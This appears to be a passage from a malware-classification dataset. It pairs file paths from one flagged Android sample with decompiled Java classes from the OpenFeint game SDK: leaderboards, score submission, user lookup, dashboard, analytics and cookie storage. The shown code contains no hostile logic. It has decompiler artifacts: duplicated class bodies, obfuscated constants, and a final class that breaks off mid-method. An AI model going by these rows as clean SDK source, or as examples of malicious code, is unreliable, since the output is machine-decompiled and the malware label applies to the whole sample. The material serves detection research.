"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\DownloadIconCB.code","public static abstract class DownloadIconCB extends APICallback {   public abstract void onSuccess(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\DownloadProfilePictureCB.code","public static abstract class DownloadProfilePictureCB extends APICallback {   public abstract void onSuccess(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\FindCB.code","public static abstract class FindCB extends APICallback {   public abstract void onSuccess(  User user); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\GetCB.code","public static abstract class GetCB extends APICallback {   public abstract void onSuccess(  ServerTimestamp serverTimestamp); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\GetFriendsCB.code","public static abstract class GetFriendsCB extends APICallback {   public abstract void onSuccess(  List<User> list); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\GetScoresCB.code","public static abstract class GetScoresCB extends APICallback {   public abstract void onSuccess(  List<Score> list); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\GetUserScoreCB.code","public static abstract class GetUserScoreCB extends APICallback {   public abstract void onSuccess(  Score score); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\Leaderboard.code","public class Leaderboard extends Resource {   public boolean allowsWorseScores;   public boolean descendingSortOrder=true;   public List<Score> highScores;   public Score localUserScore;   public String name; public static abstract class GetScoresCB extends APICallback {     public abstract void onSuccess(    List<Score> list);   } public static abstract class GetUserScoreCB extends APICallback {     public abstract void onSuccess(    Score score);   } public static abstract class ListCB extends APICallback {     public abstract void onSuccess(    List<Leaderboard> list);   }   public Leaderboard(  String resourceID){     setResourceID(resourceID);   }   public void getScores(  GetScoresCB cb){     getScores(false,cb);   }   public void getFriendScores(  GetScoresCB cb){     getScores(true,cb);   }   private void getScores(  final boolean friends,  final GetScoresCB cb){     final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/leaderboards/""+ resourceID()+ ""/high_scores"";     OrderedArgList args=new OrderedArgList();     if (friends) {       args.put(""friends_leaderboard"",""true"");     }     JSONRequest req=new JSONRequest(args){       @Override public boolean wantsLogin(){         return friends;       }       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return path;       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           List<Score> scores=(List)responseBody;           cb.onSuccess(scores);         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void getUserScore(  User forUser,  final GetUserScoreCB cb){     final String path=""/xp/users/"" + forUser.resourceID() + ""/games/""+ OpenFeintInternal.getInstance().getAppID()+ ""/leaderboards/""+ resourceID()+ ""/current_score"";     OrderedArgList args=new OrderedArgList();     JSONRequest req=new JSONRequest(args){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return path;       }       @Override public void onResponse(      int responseCode,      Object responseBody){         if (cb != null) {           if (200 <= responseCode && responseCode < 300) {             cb.onSuccess((Score)responseBody);             return;           }           if (404 == responseCode) {             cb.onSuccess(null);           }  else           if (responseBody instanceof ServerException) {             onFailure(((ServerException)responseBody).message);           }  else {             onFailure(OpenFeintInternal.getRString(R.string.of_unknown_server_error));           }         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public static void list(  final ListCB cb){     final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/leaderboards"";     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return path;       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           try {             List<Leaderboard> leaderboards=(List)responseBody;             cb.onSuccess(leaderboards);           }  catch (          Exception e) {             onFailure(OpenFeintInternal.getRString(R.string.of_unexpected_response_format));           }         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public Leaderboard(){   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(Leaderboard.class,""leaderboard""){       @Override public Resource factory(){         return new Leaderboard();       }     } ;     klass.mProperties.put(""name"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Leaderboard)obj).name;       }       @Override public void set(      Resource obj,      String val){         ((Leaderboard)obj).name=val;       }     } );     klass.mProperties.put(""current_user_high_score"",new NestedResourceProperty(Score.class){       @Override public Resource get(      Resource obj){         return ((Leaderboard)obj).localUserScore;       }       @Override public void set(      Resource obj,      Resource val){         ((Leaderboard)obj).localUserScore=(Score)val;       }     } );     klass.mProperties.put(""descending_sort_order"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((Leaderboard)obj).descendingSortOrder;       }       @Override public void set(      Resource obj,      boolean val){         ((Leaderboard)obj).descendingSortOrder=val;       }     } );     klass.mProperties.put(""allow_posting_lower_scores"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((Leaderboard)obj).allowsWorseScores;       }       @Override public void set(      Resource obj,      boolean val){         ((Leaderboard)obj).allowsWorseScores=val;       }     } );     klass.mProperties.put(""high_scores"",new ArrayResourceProperty(Score.class){       @Override public List<? extends Resource> get(      Resource obj){         return ((Leaderboard)obj).highScores;       }       @Override public void set(      Resource obj,      List<?> list){         ((Leaderboard)obj).highScores=list;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\ListCB.code","public static abstract class ListCB extends APICallback {   public abstract void onSuccess(  List<Achievement> list); } public static abstract class ListCB extends APICallback {   public abstract void onSuccess(  List<String> list); } public static abstract class ListCB extends APICallback {   public abstract void onSuccess(  List<Leaderboard> list); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\LoadCB.code","public static abstract class LoadCB extends APICallback {   public abstract void onSuccess(); } public static abstract class LoadCB extends APICallback {   public abstract void onSuccess(  byte[] bArr); } public static abstract class LoadCB extends APICallback {   public abstract void onSuccess(); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\SaveCB.code","public static abstract class SaveCB extends APICallback {   public abstract void onSuccess(); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\Score.code","public class Score extends Resource {   public byte[] blob;   private BlobUploadParameters blobUploadParameters;   private String blobUrl;   public String customData;   public String displayText;   public double latitude;   public int leaderboardId;   public double longitude;   public int rank;   public long score;   public User user; public static abstract class DownloadBlobCB extends APICallback {     public abstract void onSuccess();   }   public Score(  long score){     this.score=score;   }   public Score(  long score,  String displayText){     this.score=score;     this.displayText=displayText;   }   public boolean hasBlob(){     return this.blobUrl != null;   } public static abstract class SubmitToCB extends APICallback {     public abstract void onSuccess(    boolean z);     public void onBlobUploadSuccess(){     }     public void onBlobUploadFailure(    String exceptionMessage){     }   }   public void submitTo(  Leaderboard leaderboard,  SubmitToCB cb){     submitToInternal(leaderboard,null,cb,false);   }   public void submitToFromOffline(  Leaderboard leaderboard,  String timestamp,  SubmitToCB cb){     submitToInternal(leaderboard,timestamp,cb,true);   }   private void submitToInternal(  final Leaderboard leaderboard,  String timestamp,  final SubmitToCB cb,  final boolean fromOffline){     if (leaderboard == null || leaderboard.resourceID() == null || leaderboard.resourceID().length() == 0) {       if (cb != null) {         cb.onFailure(""No leaderboard ID provided.  Please provide a leaderboard ID from the Dev Dashboard."");         return;       }       return;     }     if (!OpenFeintInternal.getInstance().isUserLoggedIn()) {       OfflineSupport.postOfflineScore(this,leaderboard);       if (cb != null) {         cb.onSuccess(false);         return;       }       return;     }     final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/leaderboards/""+ leaderboard.resourceID()+ ""/high_scores"";     OrderedArgList args=new OrderedArgList();     args.put(""high_score[score]"",new Long(this.score).toString());     if (this.displayText != null) {       args.put(""high_score[display_text]"",this.displayText);     }     final boolean uploadBlob=this.blob != null;     args.put(""high_score[has_blob]"",uploadBlob ? ""1"" : ""0"");     if (timestamp != null) {       args.put(""high_score[timestamp]"",timestamp);     }     JSONRequest req=new JSONRequest(args){       @Override public String method(){         return ""POST"";       }       @Override public String path(){         return path;       }       @Override protected void onResponse(      int responseCode,      Object responseBody){         if (201 == responseCode) {           if (!fromOffline) {             Resources r=OpenFeintInternal.getInstance().getContext().getResources();             SimpleNotification.show(r.getString(R.string.of_score_submitted_notification),""@drawable/of_icon_highscore_notification"",Notification.Category.HighScore,Notification.Type.Success);           }           if (cb != null) {             cb.onSuccess(true);           }           perhapsUploadBlob(uploadBlob,responseBody);           return;         }         if (200 <= responseCode && responseCode < 300) {           if (cb != null) {             cb.onSuccess(false);           }         }  else {           if ((responseCode == 0 || 500 <= responseCode) && !fromOffline) {             OfflineSupport.postOfflineScore(Score.this,leaderboard);             if (cb != null) {               cb.onSuccess(false);               return;             }             return;           }           onFailure(responseBody);         }       }       private final void perhapsUploadBlob(      boolean uploadBlob2,      Object responseBody){         if (uploadBlob2 && (responseBody instanceof List)) {           List<Score> scores=(List)responseBody;           Score s=scores.get(0);           BlobPostRequest postRequest=new CompressedBlobPostRequest(s.blobUploadParameters,String.format(""blob.%s.bin"",s.resourceID()),Score.this.blob);           if (cb != null) {             final SubmitToCB submitToCB=cb;             postRequest.setDelegate(new IRawRequestDelegate(){               @Override public void onResponse(              int responseCode,              String responseBody2){                 if (200 <= responseCode && responseCode < 300) {                   submitToCB.onBlobUploadSuccess();                 }  else {                   submitToCB.onBlobUploadFailure(responseBody2);                 }               }             } );           }           postRequest.launch();         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void downloadBlob(  final DownloadBlobCB cb){     if (hasBlob()) {       DownloadRequest req=new CompressedBlobDownloadRequest(){         @Override public boolean signed(){           return false;         }         @Override public String url(){           return Score.this.blobUrl;         }         @Override public String path(){           return """";         }         @Override protected void onSuccessDecompress(        byte[] bodyData){           Score.this.blob=bodyData;           if (cb != null) {             cb.onSuccess();           }         }         @Override public void onFailure(        String exceptionMessage){           super.onFailure(exceptionMessage);           if (cb != null) {             cb.onFailure(exceptionMessage);           }         }       } ;       req.launch();     }  else     if (cb != null) {       cb.onFailure(OpenFeintInternal.getRString(R.string.of_no_blob));     }   } public static abstract class BlobDownloadedDelegate {     public void blobDownloadedForScore(    Score score){     }   }   public static void setBlobDownloadedDelegate(  BlobDownloadedDelegate delegate){     ScoreBlobDelegate.sBlobDownloadedDelegate=delegate;   }   public Score(){   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(Score.class,""high_score""){       @Override public Resource factory(){         return new Score();       }     } ;     klass.mProperties.put(""score"",new LongResourceProperty(){       @Override public long get(      Resource obj){         return ((Score)obj).score;       }       @Override public void set(      Resource obj,      long val){         ((Score)obj).score=val;       }     } );     klass.mProperties.put(""rank"",new IntResourceProperty(){       @Override public int get(      Resource obj){         return ((Score)obj).rank;       }       @Override public void set(      Resource obj,      int val){         ((Score)obj).rank=val;       }     } );     klass.mProperties.put(""leaderboard_id"",new IntResourceProperty(){       @Override public int get(      Resource obj){         return ((Score)obj).leaderboardId;       }       @Override public void set(      Resource obj,      int val){         ((Score)obj).leaderboardId=val;       }     } );     klass.mProperties.put(""display_text"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Score)obj).displayText;       }       @Override public void set(      Resource obj,      String val){         ((Score)obj).displayText=val;       }     } );     klass.mProperties.put(""custom_data"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Score)obj).customData;       }       @Override public void set(      Resource obj,      String val){         ((Score)obj).customData=val;       }     } );     klass.mProperties.put(o.e,new DoubleResourceProperty(){       @Override public double get(      Resource obj){         return ((Score)obj).latitude;       }       @Override public void set(      Resource obj,      double val){         ((Score)obj).latitude=val;       }     } );     klass.mProperties.put(o.d,new DoubleResourceProperty(){       @Override public double get(      Resource obj){         return ((Score)obj).longitude;       }       @Override public void set(      Resource obj,      double val){         ((Score)obj).longitude=val;       }     } );     klass.mProperties.put(""user"",new NestedResourceProperty(User.class){       @Override public Resource get(      Resource obj){         return ((Score)obj).user;       }       @Override public void set(      Resource obj,      Resource val){         ((Score)obj).user=(User)val;       }     } );     klass.mProperties.put(""blob_url"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Score)obj).blobUrl;       }       @Override public void set(      Resource obj,      String val){         ((Score)obj).blobUrl=val;       }     } );     klass.mProperties.put(""blob_upload_parameters"",new NestedResourceProperty(BlobUploadParameters.class){       @Override public Resource get(      Resource obj){         return ((Score)obj).blobUploadParameters;       }       @Override public void set(      Resource obj,      Resource val){         ((Score)obj).blobUploadParameters=(BlobUploadParameters)val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\ServerTimestamp.code","public class ServerTimestamp extends Resource {   public long secondsSinceEpoch;   public Date timestamp; public static abstract class GetCB extends APICallback {     public abstract void onSuccess(    ServerTimestamp serverTimestamp);   }   public static void get(  final GetCB cb){     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return ""/xp/server_timestamp"";       }       @Override public void onSuccess(      Object responseBody){         if (GetCB.this != null) {           GetCB.this.onSuccess((ServerTimestamp)responseBody);         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (GetCB.this != null) {           GetCB.this.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(ServerTimestamp.class,""server_timestamp""){       @Override public Resource factory(){         return new ServerTimestamp();       }     } ;     klass.mProperties.put(""timestamp"",new DateResourceProperty(){       @Override public Date get(      Resource obj){         return ((ServerTimestamp)obj).timestamp;       }       @Override public void set(      Resource obj,      Date val){         ((ServerTimestamp)obj).timestamp=val;       }     } );     klass.mProperties.put(""seconds_since_epoch"",new LongResourceProperty(){       @Override public long get(      Resource obj){         return ((ServerTimestamp)obj).secondsSinceEpoch;       }       @Override public void set(      Resource obj,      long val){         ((ServerTimestamp)obj).secondsSinceEpoch=val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\SubmitToCB.code","public static abstract class SubmitToCB extends APICallback {   public abstract void onSuccess(  boolean z);   public void onBlobUploadSuccess(){   }   public void onBlobUploadFailure(  String exceptionMessage){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\UnlockCB.code","public static abstract class UnlockCB extends APICallback {   public abstract void onSuccess(  boolean z); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\UpdateProgressionCB.code","public static abstract class UpdateProgressionCB extends APICallback {   public abstract void onSuccess(  boolean z); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\User.code","public class User extends Resource {   public boolean followedByLocalUser;   public boolean followsLocalUser;   public int gamerScore;   public String lastPlayedGameId;   public String lastPlayedGameName;   public double latitude;   public double longitude;   public String name;   public boolean online;   public String profilePictureSource;   public String profilePictureUrl;   public boolean usesFacebookProfilePicture; public static abstract class DownloadProfilePictureCB extends APICallback {     public abstract void onSuccess(    Bitmap bitmap);   } public static abstract class FindCB extends APICallback {     public abstract void onSuccess(    User user);   } public static abstract class GetFriendsCB extends APICallback {     public abstract void onSuccess(    List<User> list);   } public static abstract class LoadCB extends APICallback {     public abstract void onSuccess();   }   public User(  String resourceID){     setResourceID(resourceID);   }   public String userID(){     return resourceID();   }   public void load(  final LoadCB cb){     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return ""/xp/users/"" + User.this.resourceID();       }       @Override public void onSuccess(      Object responseBody){         User.this.shallowCopyAncestorType((User)responseBody);         if (cb != null) {           cb.onSuccess();         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public static void findByName(  final String name,  final FindCB cb){     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return ""/xp/users/"" + Uri.encode(name);       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           cb.onSuccess((User)responseBody);         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public static void findByID(  final String resourceID,  final FindCB cb){     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return ""/xp/users/"" + resourceID;       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           cb.onSuccess((User)responseBody);         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void getFriends(  final GetFriendsCB cb){     OrderedArgList args=new OrderedArgList();     args.put(""user_id"",resourceID());     JSONRequest req=new JSONRequest(args){       @Override public boolean wantsLogin(){         return true;       }       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return ""/xp/friends"";       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           try {             List<User> friends=(List)responseBody;             cb.onSuccess(friends);           }  catch (          Exception e) {             onFailure(OpenFeintInternal.getRString(R.string.of_unexpected_response_format));           }         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void downloadProfilePicture(  final DownloadProfilePictureCB cb){     if (this.profilePictureUrl == null) {       if (cb != null) {         cb.onFailure(OpenFeintInternal.getRString(R.string.of_profile_url_null));       }     }  else {       BitmapRequest req=new BitmapRequest(){         @Override public String url(){           return User.this.profilePictureUrl;         }         @Override public String path(){           return """";         }         @Override public void onSuccess(        Bitmap responseBody){           if (cb != null) {             cb.onSuccess(responseBody);           }         }         @Override public void onFailure(        String exceptionMessage){           if (cb != null) {             cb.onFailure(exceptionMessage);           }         }       } ;       req.launch();     }   }   public User(){   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(User.class,""user""){       @Override public Resource factory(){         return new User();       }     } ;     klass.mProperties.put(""name"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((User)obj).name;       }       @Override public void set(      Resource obj,      String val){         ((User)obj).name=val;       }     } );     klass.mProperties.put(""profile_picture_url"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((User)obj).profilePictureUrl;       }       @Override public void set(      Resource obj,      String val){         ((User)obj).profilePictureUrl=val;       }     } );     klass.mProperties.put(""profile_picture_source"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((User)obj).profilePictureSource;       }       @Override public void set(      Resource obj,      String val){         ((User)obj).profilePictureSource=val;       }     } );     klass.mProperties.put(""uses_facebook_profile_picture"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((User)obj).usesFacebookProfilePicture;       }       @Override public void set(      Resource obj,      boolean val){         ((User)obj).usesFacebookProfilePicture=val;       }     } );     klass.mProperties.put(""last_played_game_id"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((User)obj).lastPlayedGameId;       }       @Override public void set(      Resource obj,      String val){         ((User)obj).lastPlayedGameId=val;       }     } );     klass.mProperties.put(""last_played_game_name"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((User)obj).lastPlayedGameName;       }       @Override public void set(      Resource obj,      String val){         ((User)obj).lastPlayedGameName=val;       }     } );     klass.mProperties.put(""gamer_score"",new IntResourceProperty(){       @Override public int get(      Resource obj){         return ((User)obj).gamerScore;       }       @Override public void set(      Resource obj,      int val){         ((User)obj).gamerScore=val;       }     } );     klass.mProperties.put(""following_local_user"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((User)obj).followsLocalUser;       }       @Override public void set(      Resource obj,      boolean val){         ((User)obj).followsLocalUser=val;       }     } );     klass.mProperties.put(""followed_by_local_user"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((User)obj).followedByLocalUser;       }       @Override public void set(      Resource obj,      boolean val){         ((User)obj).followedByLocalUser=val;       }     } );     klass.mProperties.put(""online"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((User)obj).online;       }       @Override public void set(      Resource obj,      boolean val){         ((User)obj).online=val;       }     } );     klass.mProperties.put(o.e,new DoubleResourceProperty(){       @Override public double get(      Resource obj){         return ((User)obj).latitude;       }       @Override public void set(      Resource obj,      double val){         ((User)obj).latitude=val;       }     } );     klass.mProperties.put(o.d,new DoubleResourceProperty(){       @Override public double get(      Resource obj){         return ((User)obj).longitude;       }       @Override public void set(      Resource obj,      double val){         ((User)obj).longitude=val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.ui\Dashboard.code","public class Dashboard extends WebNav {   private static List<Dashboard> sOpenDashboards=new ArrayList();   boolean mRootIsHome=true;   public static void open(){     open(null,false);   }   public static void openFromSpotlight(){     open(""user.json?spotlight=true"",true);   }   public static void close(){     for (    Dashboard d : sOpenDashboards) {       d.finish();     }   }   public static void openLeaderboards(){     open(""leaderboards"",false);   }   public static void openLeaderboard(  String leaderboardId){     open(""leaderboard?leaderboard_id="" + leaderboardId,false);   }   public static void openAchievements(){     open(""achievements"",false);   }   public static void openGameDetail(  String appId){     open(""game?game_id="" + appId,false);   }   private static void open(  String screenName,  boolean spotlight){     OpenFeint.trySubmitOfflineData();     OpenFeintInternal ofi=OpenFeintInternal.getInstance();     if (!ofi.isFeintServerReachable()) {       Resources r=OpenFeintInternal.getInstance().getContext().getResources();       TwoLineNotification.show(r.getString(R.string.of_offline_notification),r.getString(R.string.of_offline_notification_line2),Notification.Category.Foreground,Notification.Type.NetworkOffline);       return;     }     ofi.getAnalytics().markDashboardOpen();     Intent intent=new Intent(ofi.getContext(),(Class<?>)Dashboard.class);     if (screenName != null) {       intent.putExtra(""screenName"",screenName);     }     ofi.submitIntent(intent,spotlight);   }   @Override public void onResume(){     super.onResume();     if (!sOpenDashboards.contains(this)) {       sOpenDashboards.add(this);     }     if (OpenFeintInternal.getInstance().getCurrentUser() == null) {       finish();     }   }   @Override public void onDestroy(){     super.onDestroy();     sOpenDashboards.remove(this);     OpenFeintInternal.getInstance().getAnalytics().markDashboardClose();   }   @Override public boolean onCreateOptionsMenu(  Menu menu){     getMenuInflater().inflate(R.menu.of_dashboard,menu);     return true;   }   @Override public boolean onPrepareOptionsMenu(  Menu menu){     menu.findItem(R.id.home).setVisible(!this.mRootIsHome || this.pageStackCount > 1);     return true;   }   @Override public boolean onOptionsItemSelected(  MenuItem item){     String menuButtonName=null;     if (item.getItemId() == R.id.home) {       menuButtonName=""home"";       this.mRootIsHome=true;     }  else     if (item.getItemId() == R.id.settings) {       menuButtonName=""settings"";     }  else     if (item.getItemId() == R.id.exit_feint) {       menuButtonName=""exit"";     }     if (menuButtonName == null) {       return super.onOptionsItemSelected(item);     }     executeJavascript(String.format(""OF.menu('%s')"",menuButtonName));     return true;   }   @Override protected String initialContentPath(){     String screenName=getIntent().getStringExtra(""screenName"");     if (screenName == null) {       return ""dashboard/user"";     }     this.mRootIsHome=false;     return ""dashboard/"" + screenName;   }   @Override protected WebNav.ActionHandler createActionHandler(  WebNav webNav){     return new DashboardActionHandler(webNav);   } private class DashboardActionHandler extends WebNav.ActionHandler {     public DashboardActionHandler(    WebNav webNav){       super(webNav);     }     @Override protected void populateActionList(    List<String> actionList){       super.populateActionList(actionList);       actionList.add(""openSettings"");     }     public final void openSettings(    Map<String,String> options){       Settings.open();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.ui\DashboardActionHandler.code","private class DashboardActionHandler extends WebNav.ActionHandler {   public DashboardActionHandler(  WebNav webNav){     super(webNav);   }   @Override protected void populateActionList(  List<String> actionList){     super.populateActionList(actionList);     actionList.add(""openSettings"");   }   public final void openSettings(  Map<String,String> options){     Settings.open();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Analytics.code","public class Analytics {   long dashboardMilliseconds;   Date dashboardStart;   long gameSessionMilliseconds;   int numDashboardLaunches;   int numGameSessions;   int numOnlineGameSessions;   Date sessionStart;   public Analytics(){     SharedPreferences prefs=OpenFeintInternal.getInstance().getContext().getSharedPreferences(""FeintAnalytics"",0);     prefs.getInt(""dashboardLaunches"",this.numDashboardLaunches);     prefs.getInt(""sessionLaunches"",this.numGameSessions);     prefs.getInt(""onlineSessions"",this.numOnlineGameSessions);     prefs.getLong(""sessionMilliseconds"",this.gameSessionMilliseconds);     prefs.getLong(""dashboardMilliseconds"",this.dashboardMilliseconds);   }   public void markDashboardOpen(){     this.numDashboardLaunches++;     this.dashboardStart=new Date();     update();   }   public void markDashboardClose(){     if (this.dashboardStart != null) {       this.dashboardMilliseconds+=new Date().getTime() - this.dashboardStart.getTime();       this.dashboardStart=null;       update();       return;     }     OpenFeintInternal.log(""Analytics"",""Dashboard closed without known starting time"");   }   public void markSessionOpen(  boolean online){     this.numGameSessions++;     if (online) {       this.numOnlineGameSessions++;     }     this.sessionStart=new Date();     update();   }   public void markSessionClose(){     if (this.sessionStart != null) {       this.gameSessionMilliseconds+=new Date().getTime() - this.sessionStart.getTime();       this.sessionStart=null;       update();       return;     }     OpenFeintInternal.log(""Analytics"",""Session closed without known starting time"");   }   private void update(){     SharedPreferences.Editor prefs=OpenFeintInternal.getInstance().getContext().getSharedPreferences(""FeintAnalytics"",0).edit();     prefs.putInt(""dashboardLaunches"",this.numDashboardLaunches);     prefs.putInt(""sessionLaunches"",this.numGameSessions);     prefs.putInt(""onlineSessions"",this.numOnlineGameSessions);     prefs.putLong(""sessionMilliseconds"",this.gameSessionMilliseconds);     prefs.putLong(""dashboardMilliseconds"",this.dashboardMilliseconds);     prefs.commit();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\APICallback.code","public abstract class APICallback {   public void onFailure(  String exceptionMessage){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\CookieStore.code","public class CookieStore extends BasicCookieStore {   static final String COOKIE_PREFIX=""_of_cookie_"";   static final int COOKIE_PREFIX_LEN=COOKIE_PREFIX.length();   static final String COOKIE_VALUE_TAG=""value"";   static final int COOKIE_VALUE_TAG_LEN=COOKIE_VALUE_TAG.length();   static final String TAG=""CookieStore"";   SyncedStore mSharedPreferences;   public synchronized void saveInstanceState(  Bundle outState){     for (    Cookie c : super.getCookies()) {       cookieToBundle(c,outState);     }   }   public synchronized void restoreInstanceState(  Bundle inState){     for (    String k : inState.keySet()) {       if (k.startsWith(COOKIE_PREFIX) && k.endsWith(COOKIE_VALUE_TAG)) {         String cookieName=k.substring(COOKIE_PREFIX_LEN,k.length() - COOKIE_VALUE_TAG_LEN);         BasicClientCookie c=cookieFromBundle(inState,cookieName);         super.addCookie(c);       }     }   }   public CookieStore(  SyncedStore sp){     this.mSharedPreferences=sp;     SyncedStore.Reader r=this.mSharedPreferences.read();     try {       for (      String k : r.keySet()) {         if (k.startsWith(COOKIE_PREFIX) && k.endsWith(COOKIE_VALUE_TAG)) {           String cookieName=k.substring(COOKIE_PREFIX_LEN,k.length() - COOKIE_VALUE_TAG_LEN);           BasicClientCookie c=cookieFromPrefs(r,cookieName);           super.addCookie(c);         }       }     }   finally {       r.complete();     }   }   private BasicClientCookie cookieFromBundle(  Bundle b,  String cookieName){     String prefix=COOKIE_PREFIX + cookieName;     String cookieValue=b.getString(String.valueOf(prefix) + COOKIE_VALUE_TAG);     if (cookieValue == null) {       return null;     }     String cookiePath=b.getString(String.valueOf(prefix) + ""path"");     String cookieDomain=b.getString(String.valueOf(prefix) + ""domain"");     String cookieExpiry=b.getString(String.valueOf(prefix) + ""expiry"");     BasicClientCookie c=new BasicClientCookie(cookieName,cookieValue);     c.setPath(cookiePath);     c.setDomain(cookieDomain);     if (cookieExpiry != null) {       